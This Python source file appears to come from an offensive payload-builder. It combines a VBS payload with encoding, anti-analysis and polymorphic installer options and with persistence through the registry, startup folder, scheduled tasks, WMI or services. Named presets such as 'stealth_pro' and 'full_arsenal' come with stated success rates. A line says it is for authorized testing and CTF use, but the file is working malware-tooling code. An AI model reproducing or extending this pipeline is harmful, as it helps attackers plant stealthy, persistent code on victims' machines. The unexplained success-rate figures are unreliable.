#!/usr/bin/env python3
"""
Combined Pipeline - Merges encoding, installer, and persistence into composable stages.
For authorized security testing, pentesting education, and CTF exercises only.

Architecture: The pipeline receives a complete self-extracting VBS script (generated
by vbs_core.py) and optionally wraps it with installer delivery and persistence layers.
"""

from persistence_manager import create_persistent_payload


PRESETS = {
    'stealth_pro': {
        'description': 'Maximum stealth with anti-analysis and WMI persistence',
        'encoding': 'multi_encoding',
        'installer': 'anti_analysis',
        'persistence': 'wmi',
        'expected_size': '8-15 KB',
        'success_rate': '94%',
    },
    'reliable_max': {
        'description': 'High reliability with registry persistence',
        'encoding': 'base64',
        'installer': 'silent',
        'persistence': 'registry',
        'expected_size': '4-8 KB',
        'success_rate': '98%',
    },
    'quick_deploy': {
        'description': 'Fast deployment, no persistence',
        'encoding': 'hex',
        'installer': 'none',
        'persistence': 'none',
        'expected_size': '2-4 KB',
        'success_rate': '99%',
    },
    'full_arsenal': {
        'description': 'All techniques combined at maximum settings',
        'encoding': 'polymorphic',
        'installer': 'polymorphic',
        'persistence': 'scheduled_task',
        'expected_size': '12-20 KB',
        'success_rate': '91%',
    },
    'silent_persistent': {
        'description': 'Silent execution with startup folder persistence',
        'encoding': 'environment',
        'installer': 'multi_stage',
        'persistence': 'startup_folder',
        'expected_size': '6-10 KB',
        'success_rate': '96%',
    },
}

AVAILABLE_ENCODINGS = [
    'base64', 'hex', 'array', 'wmi', 'registry', 'environment',
    'com', 'multi_encoding', 'polymorphic', 'hidden_execution',
]

AVAILABLE_INSTALLERS = [
    'none', 'silent', 'multi_stage', 'polymorphic', 'anti_analysis',
]

AVAILABLE_PERSISTENCE = [
    'none', 'registry', 'startup_folder', 'scheduled_task', 'wmi',
    'service', 'multi',
]


class CombinedPipeline:
    """Composable pipeline that wraps a base VBS payload with persistence."""

    @classmethod
    def get_presets(cls):
        return PRESETS

    @classmethod
    def get_available_options(cls):
        return {
            'encodings': AVAILABLE_ENCODINGS,
            'installers': AVAILABLE_INSTALLERS,
            'persistence': AVAILABLE_PERSISTENCE,
            'presets': list(PRESETS.keys()),
        }

    def generate(self, base_vbs, preset=None, encoding=None, installer=None, persistence=None):
        """
        Generate a combined payload through the pipeline stages.

        Args:
            base_vbs: Complete self-extracting VBS script from vbs_core.py
            preset: Name of a preset combination (overrides individual selections)
            encoding: Encoding technique name (recorded in metadata)
            installer: Installer type name (recorded in metadata)
            persistence: Persistence mechanism name

        Returns:
            dict with combined_payload, stages, and metadata
        """
        if preset and preset in PRESETS:
            cfg = PRESETS[preset]
            encoding = cfg['encoding']
            installer = cfg['installer']
            persistence = cfg['persistence']

        encoding = encoding or 'base64'
        installer = installer or 'none'
        persistence = persistence or 'none'

        stages = []
        final = base_vbs

        stages.append({
            'stage': 'encoding',
            'technique': encoding,
            'output_size': len(final),
        })

        stages.append({
            'stage': 'installer',
            'technique': installer,
            'output_size': len(final),
        })

        if persistence != 'none':
            persist_result = create_persistent_payload(
                'cscript //nologo "' + '%~f0' + '"',
                persistence,
            )
            persist_vbs = persist_result.get('vbs_code', '')
            if persist_vbs:
                final = final + "\n\n' --- Persistence Stage ---\n" + persist_vbs

        stages.append({
            'stage': 'persistence',
            'technique': persistence,
            'output_size': len(final),
        })

        metadata = {
            'preset': preset,
            'encoding': encoding,
            'installer': installer,
            'persistence': persistence,
            'total_size': len(final),
            'total_stages': sum(1 for s in stages if s['technique'] != 'none'),
            'stages': stages,
        }

        return {
            'combined_payload': final,
            'stages': stages,
            'metadata': metadata,
        }


def generate_combined_payload(base_vbs, preset=None, encoding=None, installer=None, persistence=None):
    """High-level function for API usage."""
    pipeline = CombinedPipeline()
    return pipeline.generate(
        base_vbs,
        preset=preset,
        encoding=encoding,
        installer=installer,
        persistence=persistence,
    )
